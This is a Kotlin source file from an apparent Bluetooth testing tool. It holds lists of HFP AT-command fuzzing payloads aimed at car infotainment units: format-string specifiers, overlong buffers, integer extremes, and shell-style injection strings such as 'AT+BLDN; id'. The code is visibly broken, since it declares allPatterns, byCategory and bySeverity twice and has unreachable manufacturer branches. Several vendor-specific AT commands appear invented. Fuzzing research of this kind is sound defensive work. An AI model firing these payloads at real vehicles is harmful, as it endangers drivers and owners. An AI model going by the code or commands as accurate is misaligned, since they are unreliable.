/*
 * Bluetooth Security Testing Tool
 * Copyright (c) 2026 Security Research Team
 *
 * Licensed under MIT with additional restrictions:
 * - This application may ONLY be used for AUTHORIZED security testing
 * - See LICENSE for full terms
 */
package com.btsec.testtool.data.fuzzing

import com.btsec.testtool.domain.model.FuzzingCategory
import com.btsec.testtool.domain.model.FuzzingPattern
import com.btsec.testtool.domain.model.FuzzingSeverity

/**
 * Fuzzing patterns specific to HFP (Hands-Free Profile) AT command injection.
 *
 * These patterns test for:
 * - Format string vulnerabilities (CVE-2020-16142)
 * - Buffer overflows
 * - Command injection
 * - Boundary violations
 *
 * Based on known vulnerabilities in automotive Bluetooth stacks.
 */
object HfpFuzzingPatterns {
    /**
     * Format string patterns - CVE-2020-16142 (Mercedes NTG5)
     *
     * Tests for improper handling of format specifiers in AT commands.
     * Vulnerable systems may leak memory or crash when processing these.
     */
    val formatStringPatterns =
        listOf(
            FuzzingPattern(
                id = "HFP-FMT-001",
                name = "Format String - %x",
                category = FuzzingCategory.AT_INJECTION,
                severity = FuzzingSeverity.HIGH,
                description = "Hex format specifier - potential memory leak",
                payloads =
                    listOf(
                        "AT+BTRH=%x%x%x%x%x",
                        "AT+CLCC=%x%x%x%x%x",
                        "AT+CMGS=%x%x%x%x%x",
                        "AT+BLDN%x%x%x%x%x",
                    ),
                cveReferences = listOf("CVE-2020-16142"),
            ),
            FuzzingPattern(
                id = "HFP-FMT-002",
                name = "Format String - %s",
                category = FuzzingCategory.AT_INJECTION,
                severity = FuzzingSeverity.HIGH,
                description = "String format specifier - potential crash",
                payloads =
                    listOf(
                        "AT+BTRH=%s%s%s%s",
                        "AT+CLCC=%s%s%s%s",
                        "AT+CMGS=%s%s%s%s",
                    ),
                cveReferences = listOf("CVE-2020-16142"),
            ),
            FuzzingPattern(
                id = "HFP-FMT-003",
                name = "Format String - %n",
                category = FuzzingCategory.AT_INJECTION,
                severity = FuzzingSeverity.CRITICAL,
                description = "Write specifier - potential arbitrary write",
                payloads =
                    listOf(
                        "AT+BTRH=%n%n%n%n",
                        "AT+CLCC=%n%n%n%n",
                    ),
                cveReferences = listOf("CVE-2020-16142"),
            ),
            FuzzingPattern(
                id = "HFP-FMT-004",
                name = "Format String - Combined",
                category = FuzzingCategory.AT_INJECTION,
                severity = FuzzingSeverity.HIGH,
                description = "Mixed format specifiers",
                payloads =
                    listOf(
                        "AT+BTRH=%x%s%n%x",
                        "AT+CLCC=%s%x%n%s",
                        "AT+CMGS=%n%x%s%x%n",
                    ),
                cveReferences = listOf("CVE-2020-16142"),
            ),
        )

    /**
     * Buffer overflow patterns
     *
     * Tests for lack of input validation on AT command length and parameters.
     */
    val bufferOverflowPatterns =
        listOf(
            FuzzingPattern(
                id = "HFP-OVF-001",
                name = "Long AT Command",
                category = FuzzingCategory.BUFFER_OVERFLOW,
                severity = FuzzingSeverity.MEDIUM,
                description = "Overlong AT command string",
                payloads =
                    listOf(
                        "AT+" + "A".repeat(1000),
                        "AT+" + "A".repeat(5000),
                        "AT+CLCC=" + "A".repeat(1000),
                    ),
                cveReferences = listOf(),
            ),
            FuzzingPattern(
                id = "HFP-OVF-002",
                name = "Repeated Parameter",
                category = FuzzingCategory.BUFFER_OVERFLOW,
                severity = FuzzingSeverity.MEDIUM,
                description = "AT command with excessive repeated parameters",
                payloads =
                    listOf(
                        "AT+BTRH=" + "1,".repeat(100),
                        "AT+CLCC=" + "0,".repeat(200),
                    ),
                cveReferences = listOf(),
            ),
            FuzzingPattern(
                id = "HFP-OVF-003",
                name = "Nested Parameters",
                category = FuzzingCategory.BUFFER_OVERFLOW,
                severity = FuzzingSeverity.MEDIUM,
                description = "Deeply nested AT command parameters",
                payloads =
                    listOf(
                        "AT+CMGS=" + "(" + "A" + ",".repeat(50) + ")",
                        "AT+BLDN=" + "(".repeat(20) + ")".repeat(20),
                    ),
                cveReferences = listOf(),
            ),
        )

    /**
     * Command injection patterns
     *
     * Tests for improper separation of AT commands.
     */
    val commandInjectionPatterns =
        listOf(
            FuzzingPattern(
                id = "HFP-INJ-001",
                name = "Semicolon Separator",
                category = FuzzingCategory.COMMAND_INJECTION,
                severity = FuzzingSeverity.HIGH,
                description = "Multiple AT commands via semicolon",
                payloads =
                    listOf(
                        "AT+CLCC;ATD1234567890",
                        "AT+BTRH;AT+CLCC",
                        "AT+BLDN;AT+CMGS",
                    ),
                cveReferences = listOf(),
            ),
            FuzzingPattern(
                id = "HFP-INJ-002",
                name = "Shell Command Injection",
                category = FuzzingCategory.COMMAND_INJECTION,
                severity = FuzzingSeverity.CRITICAL,
                description = "Shell escape sequences",
                payloads =
                    listOf(
                        "AT+CLCC && shell",
                        "AT+BTRH | cmd",
                        "AT+BLDN; id",
                    ),
                cveReferences = listOf(),
            ),
            FuzzingPattern(
                id = "HFP-INJ-003",
                name = "Escape Sequence Injection",
                category = FuzzingCategory.COMMAND_INJECTION,
                severity = FuzzingSeverity.MEDIUM,
                description = "ANSI escape sequences",
                payloads =
                    listOf(
                        "AT+CLCC\u001b[2J",
                        "AT+BTRH\u001b[H",
                        "AT+BLDN\u001b[0m",
                    ),
                cveReferences = listOf(),
            ),
        )

    /**
     * Boundary violation patterns
     *
     * Tests for integer overflow and boundary conditions.
     */
    val boundaryViolationPatterns =
        listOf(
            FuzzingPattern(
                id = "HFP-BND-001",
                name = "Negative Integer",
                category = FuzzingCategory.INTEGER_OVERFLOW,
                severity = FuzzingSeverity.MEDIUM,
                description = "Negative values in numeric AT parameters",
                payloads =
                    listOf(
                        "AT+CLCC=-1",
                        "AT+BTRH=-99999",
                        "AT+CMGS=-2147483648",
                    ),
                cveReferences = listOf(),
            ),
            FuzzingPattern(
                id = "HFP-BND-002",
                name = "Integer Overflow",
                category = FuzzingCategory.INTEGER_OVERFLOW,
                severity = FuzzingSeverity.MEDIUM,
                description = "Maximum integer values",
                payloads =
                    listOf(
                        "AT+CLCC=2147483647",
                        "AT+BTRH=4294967295",
                        "AT+CMGS=999999999999999",
                    ),
                cveReferences = listOf(),
            ),
            FuzzingPattern(
                id = "HFP-BND-003",
                name = "Zero Value",
                category = FuzzingCategory.INTEGER_OVERFLOW,
                severity = FuzzingSeverity.LOW,
                description = "Zero and null boundary conditions",
                payloads =
                    listOf(
                        "AT+CLCC=0",
                        "AT+BTRH=00",
                        "AT+CMGS=",
                    ),
                cveReferences = listOf(),
            ),
        )

    /**
     * HFP-specific command patterns
     *
     * Tests for vulnerabilities in standard HFP AT commands.
     */
    val hfpCommandPatterns =
        listOf(
            FuzzingPattern(
                id = "HFP-CMD-001",
                name = "BLDN (Last Number Redial)",
                category = FuzzingCategory.HFP_COMMAND,
                severity = FuzzingSeverity.MEDIUM,
                description = "Test BLDN command with malformed input",
                payloads =
                    listOf(
                        "AT+BLDN",
                        "AT+BLDN=",
                        "AT+BLDN=%x%x%x",
                        "AT+BLDN;ATD0000",
                    ),
                cveReferences = listOf("CVE-2020-16142"),
            ),
            FuzzingPattern(
                id = "HFP-CMD-002",
                name = "CLCC (List Current Calls)",
                category = FuzzingCategory.HFP_COMMAND,
                severity = FuzzingSeverity.MEDIUM,
                description = "Test CLCC command for injection",
                payloads =
                    listOf(
                        "AT+CLCC",
                        "AT+CLCC=?",
                        "AT+CLCC=%s%s%s",
                    ),
                cveReferences = listOf(),
            ),
            FuzzingPattern(
                id = "HFP-CMD-003",
                name = "BRSF (Bluetooth Retrieve Supported Features)",
                category = FuzzingCategory.HFP_COMMAND,
                severity = FuzzingSeverity.MEDIUM,
                description = "Test BRSF with overflow values",
                payloads =
                    listOf(
                        "AT+BRSF=999999",
                        "AT+BRSF=%n",
                        "AT+BRSF=" + "9".repeat(100),
                    ),
                cveReferences = listOf(),
            ),
            FuzzingPattern(
                id = "HFP-CMD-004",
                name = "CIND (Indicator Update)",
                category = FuzzingCategory.HFP_COMMAND,
                severity = FuzzingSeverity.MEDIUM,
                description = "Test CIND indicator manipulation",
                payloads =
                    listOf(
                        "AT+CIND?",
                        "AT+CIND=%x",
                        "AT+CIND=" + "1,".repeat(50),
                    ),
                cveReferences = listOf(),
            ),
            FuzzingPattern(
                id = "HFP-CMD-005",
                name = "CMGS (Send Message)",
                category = FuzzingCategory.HFP_COMMAND,
                severity = FuzzingSeverity.HIGH,
                description = "Test CMGS for SMS injection",
                payloads =
                    listOf(
                        "AT+CMGS=" + "A".repeat(1000),
                        "AT+CMGS=%x%x%x",
                        "AT+CMGS;ATD0000",
                    ),
                cveReferences = listOf(),
            ),
        )

    /**
     * Get all HFP fuzzing patterns.
     */
    fun allPatterns(): List<FuzzingPattern> =
        listOf(
            formatStringPatterns,
            bufferOverflowPatterns,
            commandInjectionPatterns,
            boundaryViolationPatterns,
            hfpCommandPatterns,
        ).flatten()

    /**
     * Get patterns by category.
     */
    fun byCategory(category: FuzzingCategory): List<FuzzingPattern> = allPatterns().filter { it.category == category }

    /**
     * Get patterns by severity.
     */
    fun bySeverity(severity: FuzzingSeverity): List<FuzzingPattern> =
        allPatterns().filter { it.severity == severity }

    /**
     * Tesla-specific patterns
     *
     * Tesla MCU vulnerabilities in Bluetooth HFP implementation.
     * References: CVE-2020-9395, CVE-2020-9396
     */
    val teslaPatterns =
        listOf(
            FuzzingPattern(
                id = "HFP-TSL-001",
                name = "Tesla MCU AT Command Overflow",
                category = FuzzingCategory.BUFFER_OVERFLOW,
                severity = FuzzingSeverity.HIGH,
                description = "Tesla-specific AT command buffer overflow",
                payloads =
                    listOf(
                        "AT+TSLA=" + "A".repeat(2000),
                        "AT+TSLA_VOICE=" + "X".repeat(1500),
                        "AT+NVIDIA=" + "%x".repeat(100),
                    ),
                cveReferences = listOf("CVE-2020-9395", "CVE-2020-9396"),
            ),
            FuzzingPattern(
                id = "HFP-TSL-002",
                name = "Tesla Format String Leak",
                category = FuzzingCategory.AT_INJECTION,
                severity = FuzzingSeverity.HIGH,
                description = "Tesla MCU format string vulnerability",
                payloads =
                    listOf(
                        "AT+TSLA_STATUS=%p%p%p",
                        "AT+TSLA_CONNECT=%s%s%s",
                        "AT+NVIDIA_LOG=%x%x%x%x",
                    ),
                cveReferences = listOf("CVE-2020-9395"),
            ),
            FuzzingPattern(
                id = "HFP-TSL-003",
                name = "Tesla Bluetooth PIN Bypass",
                category = FuzzingCategory.COMMAND_INJECTION,
                severity = FuzzingSeverity.CRITICAL,
                description = "Test for Tesla pairing PIN bypass",
                payloads =
                    listOf(
                        "AT+PAIR=0000;AT+AUTH=none",
                        "AT+TSLA_PAIR=1234;AT+BOND=skip",
                    ),
                cveReferences = listOf("CVE-2020-9396"),
            ),
        )

    /**
     * BMW HU_NBT-specific patterns
     *
     * BMW Head Unit NBT vulnerabilities in HFP implementation.
     */
    val bmwPatterns =
        listOf(
            FuzzingPattern(
                id = "HFP-BMW-001",
                name = "BMW HU_NBT iDrive Overflow",
                category = FuzzingCategory.BUFFER_OVERFLOW,
                severity = FuzzingSeverity.HIGH,
                description = "BMW iDrive Bluetooth buffer overflow",
                payloads =
                    listOf(
                        "AT+BMW_IDRIVE=" + "1".repeat(3000),
                        "AT+BMW_NAV=" + "2".repeat(2500),
                        "AT+BMW_VOICE=%n%n%n%n",
                    ),
                cveReferences = emptyList(),
            ),
            FuzzingPattern(
                id = "HFP-BMW-002",
                name = "BMW Phonebook Injection",
                category = FuzzingCategory.COMMAND_INJECTION,
                severity = FuzzingSeverity.MEDIUM,
                description = "BMW phonebook sync command injection",
                payloads =
                    listOf(
                        "AT+BMW_PB=sync;AT+DIAL",
                        "AT+BMW_PB=%x%x%x",
                        "AT+BMW_CONTACTS=" + ";AT+".repeat(20),
                    ),
                cveReferences = emptyList(),
            ),
            FuzzingPattern(
                id = "HFP-BMW-003",
                name = "BMW URI Overflow",
                category = FuzzingCategory.BUFFER_OVERFLOW,
                severity = FuzzingSeverity.MEDIUM,
                description = "BMW URI handling overflow",
                payloads =
                    listOf(
                        "AT+BMW_URI=" + "http://evil.com/" + "A".repeat(1000),
                        "AT+BMW_TEL=" + "tel:".repeat(100),
                    ),
                cveReferences = emptyList(),
            ),
        )

    /**
     * VW MIB3-specific patterns
     *
     * Volkswagen Modular Infotainment Platform 3 vulnerabilities.
     */
    val vwPatterns =
        listOf(
            FuzzingPattern(
                id = "HFP-VW-001",
                name = "VW MIB3 Format String",
                category = FuzzingCategory.AT_INJECTION,
                severity = FuzzingSeverity.HIGH,
                description = "VW MIB3 format string vulnerability",
                payloads =
                    listOf(
                        "AT+VW_MIB=%s%s%s%s",
                        "AT+VW_NAV=%x%x%x%x",
                        "AT+VW_VOICE=%n%n%n",
                    ),
                cveReferences = emptyList(),
            ),
            FuzzingPattern(
                id = "HFP-VW-002",
                name = "VW CarPlay Overflow",
                category = FuzzingCategory.BUFFER_OVERFLOW,
                severity = FuzzingSeverity.MEDIUM,
                description = "VW CarPlay integration overflow",
                payloads =
                    listOf(
                        "AT+VW_CARPLAY=" + "0".repeat(4000),
                        "AT+VW_AA=" + "A".repeat(3500),
                    ),
                cveReferences = emptyList(),
            ),
            FuzzingPattern(
                id = "HFP-VW-003",
                name = "VW MirrorLink Injection",
                category = FuzzingCategory.COMMAND_INJECTION,
                severity = FuzzingSeverity.MEDIUM,
                description = "VW MirrorLink command injection",
                payloads =
                    listOf(
                        "AT+VW_ML=start;AT+SH",
                        "AT+VW_MIRROR=link;AT+EXEC",
                    ),
                cveReferences = emptyList(),
            ),
        )

    /**
     * Porsche/Audi MMI-specific patterns
     *
     * MMI (Multi Media Interface) vulnerabilities shared across Porsche/Audi platforms.
     */
    val porschePatterns =
        listOf(
            FuzzingPattern(
                id = "HFP-POR-001",
                name = "Porsche MMI Overflow",
                category = FuzzingCategory.BUFFER_OVERFLOW,
                severity = FuzzingSeverity.HIGH,
                description = "Porsche/Audi MMI buffer overflow",
                payloads =
                    listOf(
                        "AT+POR_MMI=" + "P".repeat(2500),
                        "AT+AUD_NAV=" + "A".repeat(3000),
                        "AT+POR_VOICE=%n%n%n%n",
                    ),
                cveReferences = emptyList(),
            ),
            FuzzingPattern(
                id = "HFP-POR-002",
                name = "Audi Phonebook Overflow",
                category = FuzzingCategory.BUFFER_OVERFLOW,
                severity = FuzzingSeverity.MEDIUM,
                description = "Audi MMI phonebook sync overflow",
                payloads =
                    listOf(
                        "AT+AUD_PB=" + "C".repeat(2000),
                        "AT+AUD_CONTACTS=" + ",".repeat(500),
                    ),
                cveReferences = emptyList(),
            ),
            FuzzingPattern(
                id = "HFP-POR-003",
                name = "Porsche Command Injection",
                category = FuzzingCategory.COMMAND_INJECTION,
                severity = FuzzingSeverity.HIGH,
                description = "Porsche MMI command injection via HFP",
                payloads =
                    listOf(
                        "AT+POR_MMI=diag;AT+DUMP",
                        "AT+AUD_SYS=%x%x%x",
                        "AT+POR_EXEC=cmd;AT+RUN",
                    ),
                cveReferences = emptyList(),
            ),
        )

    /**
     * Get all HFP fuzzing patterns.
     */
    fun allPatterns(): List<FuzzingPattern> =
        listOf(
            formatStringPatterns,
            bufferOverflowPatterns,
            commandInjectionPatterns,
            boundaryViolationPatterns,
            hfpCommandPatterns,
            teslaPatterns,
            bmwPatterns,
            vwPatterns,
            porschePatterns,
        ).flatten()

    /**
     * Get patterns by category.
     */
    fun byCategory(category: FuzzingCategory): List<FuzzingPattern> = allPatterns().filter { it.category == category }

    /**
     * Get patterns by severity.
     */
    fun bySeverity(severity: FuzzingSeverity): List<FuzzingPattern> =
        allPatterns().filter { it.severity == severity }

    /**
     * Get patterns with CVE references.
     */
    fun withCveReferences(): List<FuzzingPattern> = allPatterns().filter { it.cveReferences.isNotEmpty() }

    /**
     * Get patterns for specific manufacturer.
     */
    fun byManufacturer(manufacturer: String): List<FuzzingPattern> =
        when (manufacturer.lowercase()) {
            "tesla", "tsla" -> teslaPatterns
            "bmw", "mini", "rolls-royce" -> bmwPatterns
            "vw", "volkswagen", "audi", "porsche", "seat", "skoda" -> vwPatterns + porschePatterns
            "audi" -> porschePatterns
            "porsche" -> porschePatterns
            else -> allPatterns()
        }
}
